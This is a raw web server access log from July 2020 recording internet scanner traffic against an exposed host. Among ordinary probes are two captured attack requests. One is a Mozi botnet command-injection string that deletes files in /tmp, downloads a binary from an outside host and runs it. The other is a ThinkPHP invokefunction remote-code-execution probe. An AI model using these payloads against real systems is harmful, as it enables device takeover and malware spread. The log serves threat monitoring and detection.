- - [10/Jul/2020:06:28:42 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [10/Jul/2020:06:28:43 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [10/Jul/2020:08:16:19 +0000] "GET /solar_api/v1/GetInverterInfo.cgi HTTP/1.1" 404 1872 "-" - "-"
- - [10/Jul/2020:08:20:46 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:08:40:00 +0000] "GET / HTTP/1.1" 200 2387 "-" - "-"
- - [10/Jul/2020:09:07:46 +0000] "GET / HTTP/1.1" 200 3970 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [10/Jul/2020:09:20:45 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:09:25:46 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [10/Jul/2020:09:33:23 +0000] "GET / HTTP/1.0" 200 2406 "-" - "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
- - [10/Jul/2020:10:20:52 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:11:21:02 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:12:21:04 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:13:21:14 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [10/Jul/2020:15:07:24 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [10/Jul/2020:16:15:57 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [10/Jul/2020:16:15:57 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [10/Jul/2020:17:53:18 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [10/Jul/2020:17:53:20 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [10/Jul/2020:22:02:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [11/Jul/2020:02:05:32 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [11/Jul/2020:02:20:37 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [11/Jul/2020:03:40:22 +0000] "GET /TP/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:22 +0000] "GET /TP/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:23 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:23 +0000] "GET /html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:25 +0000] "GET /public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:26 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:26 +0000] "GET /elrekt.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:27 +0000] "GET /index.php HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:28 +0000] "GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:03:40:30 +0000] "POST /index.php?s=captcha HTTP/1.1" 200 1272 "-" - "Go-http-client/1.1"
- - [11/Jul/2020:03:40:32 +0000] "GET / HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [11/Jul/2020:04:45:50 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [11/Jul/2020:04:45:51 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [11/Jul/2020:04:52:00 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [11/Jul/2020:06:21:40 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [11/Jul/2020:06:21:42 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
